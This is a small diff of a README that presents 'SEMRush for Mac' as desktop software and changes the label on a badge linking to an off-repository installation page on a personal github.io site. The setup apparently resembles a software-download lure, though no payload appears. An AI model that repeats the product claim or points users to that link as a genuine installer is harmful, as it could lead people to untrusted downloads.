@@ -4,7 +4,7 @@
 SEMRush for Mac brings advanced SEO and digital marketing tools directly to your desktop 💻.  
 This repository provides a full technical guide on how to use SEMRush on macOS devices.  
 
-[![Get Github Instruction](https://img.shields.io/badge/Get%20Github%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://greemsley1970.github.io/.github/)
+[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://greemsley1970.github.io/.github/)
 
 ---
 
